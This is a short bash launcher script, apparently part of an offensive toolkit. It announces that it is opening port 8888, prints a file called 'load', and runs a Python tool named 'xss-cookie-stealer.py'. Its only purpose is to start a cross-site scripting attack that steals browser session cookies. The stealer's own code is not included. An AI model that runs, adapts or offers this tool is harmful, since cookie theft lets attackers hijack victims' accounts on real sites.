#!/bin/bash
echo -e "[~] Opening new port 8888"
cat load
echo -e "[~] Loading Tool"
python xss-cookie-stealer.py
